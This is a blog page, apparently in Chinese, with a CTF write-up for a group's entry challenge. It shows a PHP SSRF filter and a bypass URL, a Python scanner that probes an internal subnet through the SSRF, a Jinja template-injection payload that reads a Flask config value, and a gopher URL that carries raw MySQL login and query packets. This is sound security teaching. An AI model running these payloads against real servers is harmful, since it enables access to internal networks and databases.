@@ -1,0 +1,739 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+<meta name="baidu-site-verification" content="5ZQsOe30cm" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"southsea.st","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="关于某CTF交流群的入群题Orz。 换新题了，可以发了。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="关于某CTF交流群的入群题">
+<meta property="og:url" content="https://southsea.st/Daily-CTF-Group-Question-4/index.html">
+<meta property="og:site_name" content="南溟丷">
+<meta property="og:description" content="关于某CTF交流群的入群题Orz。 换新题了，可以发了。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2019-01-30T00:00:00.000Z">
+<meta property="article:modified_time" content="2021-02-02T04:11:18.106Z">
+<meta property="article:author" content="南溟丷">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="SSRF">
+<meta property="article:tag" content="SSTI">
+<meta property="article:tag" content="GOPHER">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://southsea.st/Daily-CTF-Group-Question-4/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>关于某CTF交流群的入群题 | 南溟丷</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">南溟丷</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">我想在那里最蓝的大海扬帆</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://southsea.st/Daily-CTF-Group-Question-4/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="南溟丷">
+      <meta itemprop="description" content="我想在那里最蓝的大海扬帆">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="南溟丷">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          关于某CTF交流群的入群题
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-01-30 00:00:00" itemprop="dateCreated datePublished" datetime="2019-01-30T00:00:00+00:00">2019-01-30</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%97%B2%E8%B0%88/" itemprop="url" rel="index"><span itemprop="name">闲谈</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/Daily-CTF-Group-Question-4/" class="post-meta-item leancloud_visitors" data-flag-title="关于某CTF交流群的入群题" title="热度">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">热度：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <!--
+      <span class="post-meta-item-text">Valine：</span>
+      -->
+      <span class="post-meta-item-text">评论数：</span>
+    
+    <a title="valine" href="/Daily-CTF-Group-Question-4/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/Daily-CTF-Group-Question-4/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>关于某<strong>CTF</strong>交流群的入群题<strong>Orz</strong>。</p>
+<p>换新题了，可以发了。</p>
+<a id="more"></a>
+
+<p><strong>Emmm</strong>直接上题。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_inner_ip</span><span class="params">($url)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    $match_result=preg_match(<span class="string">'/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/'</span>,$url); </span><br><span class="line">    <span class="keyword">if</span> (!$match_result) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'url fomat error'</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">try</span> </span><br><span class="line">    &#123; </span><br><span class="line">        $url_parse=parse_url($url); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">catch</span>(<span class="keyword">Exception</span> $e) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'url fomat error'</span>); </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    $hostname=$url_parse[<span class="string">'host'</span>]; </span><br><span class="line">    $ip=gethostbyname($hostname); </span><br><span class="line">    $int_ip=ip2long($ip); </span><br><span class="line">    <span class="keyword">return</span> ip2long(<span class="string">'127.0.0.0'</span>)&gt;&gt;<span class="number">24</span> == $int_ip&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">'10.0.0.0'</span>)&gt;&gt;<span class="number">24</span> == $int_ip&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">'172.16.0.0'</span>)&gt;&gt;<span class="number">20</span> == $int_ip&gt;&gt;<span class="number">20</span> || ip2long(<span class="string">'192.168.0.0'</span>)&gt;&gt;<span class="number">16</span> == $int_ip&gt;&gt;<span class="number">16</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_request_url</span><span class="params">($url)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span> (check_inner_ip($url)) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">echo</span> $url.<span class="string">' is inner ip'</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">        $ch = curl_init(); </span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url); </span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>); </span><br><span class="line">        curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>); </span><br><span class="line">        $output = curl_exec($ch); </span><br><span class="line">        $result_info = curl_getinfo($ch); </span><br><span class="line">        <span class="keyword">if</span> ($result_info[<span class="string">'redirect_url'</span>]) </span><br><span class="line">        &#123; </span><br><span class="line">            safe_request_url($result_info[<span class="string">'redirect_url'</span>]); </span><br><span class="line">        &#125; </span><br><span class="line">        curl_close($ch); </span><br><span class="line">        var_dump($output); </span><br><span class="line">    &#125; </span><br><span class="line">     </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">$url = $_GET[<span class="string">'url'</span>]; </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($url))&#123; </span><br><span class="line">    safe_request_url($url); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>构造<strong>/?url=http://@127.0.0.1.:80/flag.php</strong>可以绕过，提示<strong>string(15) “172.11.243.0/24”</strong>，应该是要扫内网。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> Queue</span><br><span class="line"></span><br><span class="line">threads_count = <span class="number">10</span></span><br><span class="line">que = Queue.Queue()</span><br><span class="line">threads = []</span><br><span class="line">lock = threading.Lock()</span><br><span class="line">ports = [<span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">25</span>,<span class="number">69</span>,<span class="number">80</span>,<span class="number">81</span>,<span class="number">82</span>,<span class="number">83</span>,<span class="number">84</span>,<span class="number">110</span>,<span class="number">389</span>,<span class="number">389</span>,<span class="number">443</span>,<span class="number">445</span>,<span class="number">488</span>,<span class="number">512</span>,<span class="number">513</span>,<span class="number">514</span>,<span class="number">873</span>,<span class="number">901</span>,<span class="number">1043</span>,<span class="number">1080</span>,<span class="number">1099</span>,<span class="number">1090</span>,<span class="number">1158</span>,<span class="number">1352</span>,<span class="number">1433</span>,</span><br><span class="line">         <span class="number">1434</span>,<span class="number">1521</span>,<span class="number">2049</span>,<span class="number">2100</span>,<span class="number">2181</span>,<span class="number">2601</span>,<span class="number">2604</span>,<span class="number">3128</span>,<span class="number">3306</span>,<span class="number">3307</span>,<span class="number">3389</span>,<span class="number">4440</span>,<span class="number">4444</span>,<span class="number">4445</span>,<span class="number">4848</span>,<span class="number">5000</span>,<span class="number">5280</span>,<span class="number">5432</span>,<span class="number">5500</span>,<span class="number">5632</span>,<span class="number">5900</span>,<span class="number">5901</span>,</span><br><span class="line">         <span class="number">5902</span>,<span class="number">5903</span>,<span class="number">5984</span>,<span class="number">6000</span>,<span class="number">6033</span>,<span class="number">6082</span>,<span class="number">6379</span>,<span class="number">6666</span>,<span class="number">7001</span>,<span class="number">7001</span>,<span class="number">7002</span>,<span class="number">7070</span>,<span class="number">7101</span>,<span class="number">7676</span>,<span class="number">7777</span>,<span class="number">7899</span>,<span class="number">7988</span>,<span class="number">8000</span>,<span class="number">8001</span>,<span class="number">8002</span>,<span class="number">8003</span>,<span class="number">8004</span>,</span><br><span class="line">         <span class="number">8005</span>,<span class="number">8006</span>,<span class="number">8007</span>,<span class="number">8008</span>,<span class="number">8009</span>,<span class="number">8069</span>,<span class="number">8080</span>,<span class="number">8081</span>,<span class="number">8082</span>,<span class="number">8083</span>,<span class="number">8084</span>,<span class="number">8085</span>,<span class="number">8086</span>,<span class="number">8087</span>,<span class="number">8088</span>,<span class="number">8089</span>,<span class="number">8090</span>,<span class="number">8091</span>,<span class="number">8092</span>,<span class="number">8093</span>,<span class="number">8094</span>,<span class="number">8095</span>,</span><br><span class="line">         <span class="number">8098</span>,<span class="number">8099</span>,<span class="number">8980</span>,<span class="number">8990</span>,<span class="number">8443</span>,<span class="number">8686</span>,<span class="number">8787</span>,<span class="number">8880</span>,<span class="number">8888</span>,<span class="number">9000</span>,<span class="number">9001</span>,<span class="number">9043</span>,<span class="number">9045</span>,<span class="number">9060</span>,<span class="number">9080</span>,<span class="number">9081</span>,<span class="number">9088</span>,<span class="number">9088</span>,<span class="number">9090</span>,<span class="number">9091</span>,<span class="number">9100</span>,<span class="number">9200</span>,</span><br><span class="line">         <span class="number">9300</span>,<span class="number">9443</span>,<span class="number">9871</span>,<span class="number">9999</span>,<span class="number">10000</span>,<span class="number">10068</span>,<span class="number">10086</span>,<span class="number">11211</span>,<span class="number">20000</span>,<span class="number">22022</span>,<span class="number">22222</span>,<span class="number">27017</span>,<span class="number">28017</span>,<span class="number">50060</span>,<span class="number">50070</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">256</span>):</span><br><span class="line">    que.put(str(i))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">while</span> que.qsize() &gt; <span class="number">0</span>:</span><br><span class="line">        num = que.get()</span><br><span class="line">        <span class="keyword">for</span> port <span class="keyword">in</span> ports:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                addr = <span class="string">"172.11.243.&#123;num&#125;:&#123;port&#125;"</span>.format(num = num, port = port)</span><br><span class="line">                <span class="keyword">print</span> addr</span><br><span class="line">                url = <span class="string">"http://ctf473831530.yulige.top:12345/?url=http://"</span> + addr</span><br><span class="line">                r = requests.get(url, timeout = <span class="number">2.8</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">"bool(false)"</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                    <span class="keyword">print</span> addr + <span class="string">" is Open"</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                lock.acquire()</span><br><span class="line">                lock.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(threads_count):</span><br><span class="line">    t = threading.Thread(target = run)</span><br><span class="line">    threads.append(t)</span><br><span class="line">    t.setDaemon(<span class="literal">True</span>)</span><br><span class="line">    t.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> que.qsize() &gt; <span class="number">0</span>:</span><br><span class="line">    time.sleep(<span class="number">1.0</span>)</span><br></pre></td></tr></table></figure>
+
+<p>然后扫到了<strong>172.11.243.81:8080</strong>，访问得到如下代码。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line">app.config[<span class="string">'HINT'</span>] = os.environ.pop(<span class="string">'HINT'</span>)</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(__file__).read()</span><br><span class="line"><span class="meta">@app.route('/yulige/&lt;path:yulige&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">yulige</span><span class="params">(yulige)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span><span class="params">(s)</span>:</span></span><br><span class="line">        s = s.replace(<span class="string">'('</span>, <span class="string">''</span>).replace(<span class="string">')'</span>, <span class="string">''</span>)</span><br><span class="line">        blacklist = [<span class="string">'config'</span>, <span class="string">'self'</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>.join([<span class="string">'&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'</span>.format(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist])+s</span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(yulige))</span><br><span class="line">    &#123;&#123;get_flashed_messages.__globals__[<span class="string">'current_app'</span>].config&#125;&#125;</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(<span class="string">"0.0.0.0"</span>,port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure>
+
+<p>根据提示。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url&#x3D;http:&#x2F;&#x2F;172.11.243.81:8080&#x2F;yulige&#x2F;&#123;&#123;get_flashed_messages.globals[%27current_app%27].config[%27HINT%27]&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后得到提示。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string(29) &quot;mysql_user_is_yuligeeee123321&quot;</span><br></pre></td></tr></table></figure>
+
+<p>看来是需要使用<strong>Gopher</strong>协议对数据库进行操作。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;ctf473831530.yulige.top:12345&#x2F;?url&#x3D;gopher:&#x2F;&#x2F;localhost:80@172.11.243.218:3306&#x2F;_%25b3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2579%2575%256c%2569%2567%2565%2565%2565%2565%2531%2532%2533%2533%2532%2531%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%256b%2503%255f%256f%2573%250a%256d%2561%2563%256f%2573%2531%2530%252e%2531%2534%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2535%2530%2536%2531%2534%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2535%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%2521%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%2540%2540%2576%2565%2572%2573%2569%256f%256e%255f%2563%256f%256d%256d%2565%256e%2574%2520%256c%2569%256d%2569%2574%2520%2531%2512%2500%2500%2500%2503%2553%2545%254c%2545%2543%2554%2520%2544%2541%2554%2541%2542%2541%2553%2545%2528%2529%250c%2500%2500%2500%2502%2566%256c%2561%2534%2534%2534%2531%2531%2531%2531%2567%250f%2500%2500%2500%2503%2573%2568%256f%2577%2520%2564%2561%2574%2561%2562%2561%2573%2565%2573%250c%2500%2500%2500%2503%2573%2568%256f%2577%2520%2574%2561%2562%256c%2565%2573%251d%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%252a%2520%2566%2572%256f%256d%2520%2546%2531%2531%2531%2531%256c%256c%256c%256c%2567%2567%2567%2567%2567%2501%2500%2500%2500%2501</span><br></pre></td></tr></table></figure>
+
+
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/Web/" rel="tag"><i class="fa fa-tag"></i> Web</a>
+              <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i> CTF</a>
+              <a href="/tags/SSRF/" rel="tag"><i class="fa fa-tag"></i> SSRF</a>
+              <a href="/tags/SSTI/" rel="tag"><i class="fa fa-tag"></i> SSTI</a>
+              <a href="/tags/GOPHER/" rel="tag"><i class="fa fa-tag"></i> GOPHER</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2019-AH-Jan/" rel="prev" title="2019 安恒 1月月赛 部分题解">
+      <i class="fa fa-chevron-left"></i> 2019 安恒 1月月赛 部分题解
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/Platform-NewBugku/" rel="next" title="关于新Bugku的题解">
+      关于新Bugku的题解 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="南溟丷"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">南溟丷</p>
+  <div class="site-description" itemprop="description">我想在那里最蓝的大海扬帆</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">66</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">30</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/southseast" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;southseast" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:i@southsea.st" title="E-Mail → mailto:i@southsea.st"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://www.codemonster.cn/" title="https:&#x2F;&#x2F;www.codemonster.cn&#x2F;" rel="noopener" target="_blank">Xishir</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.lmxspace.com/" title="http:&#x2F;&#x2F;www.lmxspace.com&#x2F;" rel="noopener" target="_blank">L1nk3r</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://she1don.cn/" title="http:&#x2F;&#x2F;she1don.cn&#x2F;" rel="noopener" target="_blank">Sheldon</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.yuf1sher.xyz/" title="http:&#x2F;&#x2F;www.yuf1sher.xyz&#x2F;" rel="noopener" target="_blank">saltyfishyu</a>
+        </li>
+        <li class="links-of-blogroll-item">
